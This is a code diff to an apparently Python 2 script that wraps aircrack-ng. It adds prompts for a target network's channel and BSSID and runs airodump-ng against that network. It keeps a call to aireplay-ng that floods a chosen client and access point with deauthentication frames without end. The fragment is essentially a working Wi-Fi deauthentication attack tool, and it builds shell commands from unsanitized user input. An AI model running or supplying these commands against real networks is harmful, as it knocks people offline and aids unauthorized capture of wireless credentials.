@@ -29,6 +29,8 @@ while True:
     elif lack == 't':
       os.system("airodump-ng wlan0mon")
       p = raw_input("Enter the bssid of your target!:")
+      b = raw_input("Enter the channel of your target!:")
+      os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (b, p))
       aireplay_client = raw_input("Enter the client you want to target:")
       os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
   if main_choice == 'd':
